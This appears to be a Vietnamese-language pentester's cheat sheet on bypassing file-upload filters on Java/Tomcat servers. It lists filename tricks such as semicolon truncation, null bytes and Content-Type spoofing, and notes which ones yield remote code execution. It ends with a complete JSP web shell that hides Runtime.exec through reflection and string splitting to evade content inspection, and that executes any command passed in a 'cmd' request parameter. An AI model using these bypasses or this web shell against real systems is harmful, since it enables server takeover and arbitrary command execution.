content-type-upload :
-- shell.jsp;.jpg --> RCE --> vì dấu ; có thể ngắt và bỏ qua phần .jpg ở đằng sau --> lý do có thể ngắt : ứng dụng xử lý tên file --> lưu thành file shell.jsp --> thực thi lệnh độc hại 
    + Tomcat < 9.0.37 --> có thể ngắt tại dấu ; và chỉ giữ phần trước 
-- shell.php.jpg --> Chỉ upload đc nhưng ko RCE đc vì ko xử lý đc đuôi file là jpg 
-- shell.jsp*.png --> Chỉ upload đc nhưng ko RCE đc vì ko xử lý đc đuôi file là png 
-- shell.jsp/.jpg --> FileNotFoundException --> shell.jpg được hiểu là thư mục và file .jpg là nằm trong thư mục đó --> ko tồn tại thư mục shell.jpg cũng như không tồn tại file .jpg --> cho phép upload nhưng gặp lỗi khi truy cập để tiến hành RCE   
-- shell.jsp%00.jpg --> Cho phép upload nhưng bị lỗi Invalid URI --> kỹ thuật Null Byte Injection --> ép server xử lý file như một .jsp, thay vì .jpg --> lý do : Phiên bản java đã fix lỗi, Java không bị null byte injection xử lý tên file theo kiểu chuỗi --> không bị ảnh hưởng --> file đc lưu với tên đầy đủ shell.jsp%00.jpg 
-- shell.jsp%20.jpg --> cho phép upload nhưng không rce được --> vì ko xử lý đc đuôi file là jpg
-- shell.jsp --> RCE --> vì ứng dụng chỉ kiểm tra content-Type chứ ko kiểm tra tên file --> tên file : shell.jsp và giữ nguyên content-type là image/jpeg --> có thể bypass và RCE đc 
Reference : https://gist.github.com/nikallass/5ceef8c8c02d58ca2c69a29a92d2f461
content-inspection-bypass : 
<%!
    public static String run(String c) throws Exception {
        String part1 = "Run";
        String part2 = "time";
        Class<?> clazz = Class.forName("java.lang." + part1 + part2);
        Object rt = clazz.getMethod("get" + part1 + part2).invoke(null);
        Process proc = (Process) clazz.getMethod("exec", String.class).invoke(rt, c);
        return new java.util.Scanner(proc.getInputStream()).useDelimiter("\\A").next();
    }
%>
<%= run(request.getParameter("cmd")) %>
--> có thể RCE đc 